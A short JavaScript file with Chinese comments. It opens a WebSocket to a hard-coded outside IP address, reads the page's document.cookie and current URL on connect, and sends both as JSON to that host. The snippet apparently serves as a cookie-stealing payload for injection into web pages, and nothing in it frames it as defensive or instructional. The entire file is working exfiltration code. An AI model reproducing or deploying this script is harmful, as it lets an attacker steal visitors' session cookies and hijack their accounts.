// 创建WebSocket连接
const socket = new WebSocket('ws://47.119.25.9:6666');

socket.onopen = function() {
    // 连接建立后获取页面信息
    const cookies = document.cookie;
    const url = window.location.href;

    // 创建要发送的数据对象
    const data = {
        cookies: cookies,
        url: url
    };

    // 将数据对象转换为JSON字符串
    const jsonData = JSON.stringify(data);

    // 通过WebSocket发送数据
    socket.send(jsonData);
};

socket.onerror = function(error) {
    console.error('WebSocket Error: ' + error);
};


